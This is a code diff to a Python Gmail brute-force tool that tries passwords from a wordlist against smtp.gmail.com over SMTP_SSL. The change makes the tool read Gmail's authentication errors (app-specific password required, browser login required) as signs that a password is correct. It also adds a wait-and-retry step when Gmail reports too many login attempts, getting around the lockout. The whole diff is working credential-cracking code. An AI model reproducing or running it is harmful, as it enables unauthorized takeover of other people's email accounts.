@@ -5,6 +5,7 @@ import time
 from lib.showthing import  *
 from lib.command import *
 import codecs
+import re
 
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.ehlo()
@@ -17,26 +18,39 @@ def login(email, password):
         server.login(user_name, password)
         SysCleanScreen()
         InFo()
-        printGreen ('[+]Accounthas been cracked!')
+        printGreen ('[+]Account has been cracked!')
         ShowSucess(email, password)
         return 1
     except smtplib.SMTPAuthenticationError as e:
         error = str(e)
-        if error[14] == '<':
+        if re.search('Username and Password not accepted', error) != None:
+            return 0
+        if re.search('Too many login attempts', error) != None:
+            TryAgain(server)
+            login(user_name, password)
+        if (re.search('Application-specific password required', error) != None or
+            re.search('Please log in via your web browser', error) != None or
+            error[14] == '<'):
             SysCleanScreen()
             InFo()
-            printGreen ('[+]Accounthas been cracked!')
+            printGreen ('[+]Account has been cracked!')
             ShowSucess(email, password)
             return 1
         else:
-            return 0
+            print('Error code: ' + error + '\n')
+            printGreen ('[+]This is suspicious of being the correct password!')
+            printGreen ('[+]Please check it out!')
+            ShowSucess(email, password)
     except smtplib.SMTPServerDisconnected:
-        print('[!]Tool is waiting for server...')
-        server.close()
-        time.sleep(60)
-        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-        server.ehlo()
+        TryAgain(server)
         login(user_name, password)
+
+def TryAgain(server):
+    print('[!]Tool is waiting for server...')
+    server.close()
+    time.sleep(60)
+    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    server.ehlo()
 
 class CGmail(object):
     def __init__(self,email,wordlist):
